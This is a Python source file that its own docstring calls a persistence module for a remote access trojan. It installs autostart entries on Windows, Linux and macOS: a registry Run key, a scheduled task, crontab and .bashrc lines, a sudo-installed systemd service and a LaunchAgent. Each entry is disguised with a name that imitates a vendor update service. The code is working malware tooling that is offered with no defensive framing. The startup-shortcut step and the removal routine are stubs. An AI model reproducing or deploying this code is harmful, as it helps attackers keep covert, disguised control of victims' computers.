#!/usr/bin/env python3
"""
PERSISTENCE MODULE FOR RAT
"""

import os
import sys
import platform
import getpass
import tempfile

class Persistence:
    def __init__(self, script_path=None):
        self.script_path = script_path or os.path.abspath(sys.argv[0])
        self.system = platform.system().lower()
        self.install_methods = []
        
    def install_windows_persistence(self):
        """Install persistence on Windows"""
        try:
            # Method 1: Registry Run key
            try:
                import winreg
                key = winreg.HKEY_CURRENT_USER
                subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
                
                reg_key = winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(reg_key, "WindowsUpdate", 0, winreg.REG_SZ, self.script_path)
                winreg.CloseKey(reg_key)
                self.install_methods.append("Registry Run Key")
                print("[+] Windows registry persistence added")
            except Exception as e:
                print(f"Registry persistence failed: {e}")
            
            # Method 2: Scheduled Task
            try:
                import subprocess
                task_name = "MicrosoftEdgeUpdate"
                cmd = f'schtasks /create /tn "{task_name}" /tr "{self.script_path}" /sc onlogon /f'
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode == 0:
                    self.install_methods.append("Scheduled Task")
                    print("[+] Windows scheduled task added")
            except Exception as e:
                print(f"Task scheduler failed: {e}")
                
            # Method 3: Startup folder
            try:
                startup_path = os.path.join(os.path.expanduser("~"), "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
                if os.path.exists(startup_path):
                    shortcut_path = os.path.join(startup_path, "WindowsUpdate.lnk")
                    # Create shortcut (this would need additional code for .lnk creation)
                    self.install_methods.append("Startup Folder")
                    print("[+] Startup folder persistence configured")
            except Exception as e:
                print(f"Startup folder failed: {e}")
                
            return len(self.install_methods) > 0
            
        except Exception as e:
            print(f"Windows persistence error: {e}")
            return False

    def install_linux_persistence(self):
        """Install persistence on Linux"""
        try:
            username = getpass.getuser()
            
            # Method 1: Crontab
            try:
                import subprocess
                cron_job = f"@reboot python3 {self.script_path} > /dev/null 2>&1 &\n"
                
                # Get current crontab
                result = subprocess.run(['crontab', '-l'], capture_output=True, text=True)
                current_cron = result.stdout if result.returncode == 0 else ""
                
                # Add our job if not present
                if self.script_path not in current_cron:
                    new_cron = current_cron + cron_job
                    subprocess.run(['crontab', '-'], input=new_cron, text=True, capture_output=True)
                    self.install_methods.append("Crontab")
                    print("[+] Linux crontab persistence added")
            except Exception as e:
                print(f"Crontab failed: {e}")
            
            # Method 2: .bashrc or .profile
            try:
                bashrc_path = os.path.expanduser("~/.bashrc")
                if os.path.exists(bashrc_path):
                    with open(bashrc_path, 'a') as f:
                        f.write(f'\n# Background service\npython3 {self.script_path} > /dev/null 2>&1 &\n')
                    self.install_methods.append("Bashrc")
                    print("[+] .bashrc persistence added")
            except Exception as e:
                print(f"Bashrc failed: {e}")
            
            # Method 3: Systemd service (requires root)
            try:
                service_content = f"""[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User={username}
ExecStart=python3 {self.script_path}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
                service_path = f"/etc/systemd/system/system-update.service"
                
                # Try to create service file (might require sudo)
                with open("/tmp/system-update.service", "w") as f:
                    f.write(service_content)
                
                result = subprocess.run(['sudo', 'cp', '/tmp/system-update.service', service_path], capture_output=True)
                if result.returncode == 0:
                    subprocess.run(['sudo', 'systemctl', 'enable', 'system-update.service'], capture_output=True)
                    self.install_methods.append("Systemd Service")
                    print("[+] Systemd service persistence added")
            except Exception as e:
                print(f"Systemd service failed: {e}")
                
            return len(self.install_methods) > 0
            
        except Exception as e:
            print(f"Linux persistence error: {e}")
            return False

    def install_macos_persistence(self):
        """Install persistence on macOS"""
        try:
            # Method 1: Launch Agent
            launch_agent_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.apple.systemupdate</string>
    <key>ProgramArguments</key>
    <array>
        <string>python3</string>
        <string>{self.script_path}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
            launch_agent_path = os.path.expanduser("~/Library/LaunchAgents/com.apple.systemupdate.plist")
            
            try:
                os.makedirs(os.path.dirname(launch_agent_path), exist_ok=True)
                with open(launch_agent_path, 'w') as f:
                    f.write(launch_agent_content)
                self.install_methods.append("Launch Agent")
                print("[+] macOS Launch Agent persistence added")
            except Exception as e:
                print(f"Launch Agent failed: {e}")
                
            return len(self.install_methods) > 0
            
        except Exception as e:
            print(f"macOS persistence error: {e}")
            return False

    def install_persistence(self):
        """Install persistence based on detected OS"""
        print(f"[*] Installing persistence for: {self.system}")
        print(f"[*] Script path: {self.script_path}")
        
        success = False
        
        if self.system == 'windows':
            success = self.install_windows_persistence()
        elif self.system == 'linux':
            success = self.install_linux_persistence()
        elif self.system == 'darwin':
            success = self.install_macos_persistence()
        else:
            print(f"[-] Unsupported OS: {self.system}")
            return False
        
        if success:
            print(f"[+] Persistence installed successfully using {len(self.install_methods)} methods:")
            for method in self.install_methods:
                print(f"    - {method}")
        else:
            print("[-] Failed to install persistence")
            
        return success

    def remove_persistence(self):
        """Remove persistence mechanisms"""
        print("[*] Removing persistence...")
        
        # This would implement removal logic for each installed method
        # For now, just report what would be removed
        if self.install_methods:
            print("[+] Would remove the following persistence methods:")
            for method in self.install_methods:
                print(f"    - {method}")
        else:
            print("[-] No persistence methods to remove")
        
        return True

# Example usage
if __name__ == "__main__":
    persistence = Persistence()
    
    if len(sys.argv) > 1 and sys.argv[1] == "remove":
        persistence.remove_persistence()
    else:
        persistence.install_persistence()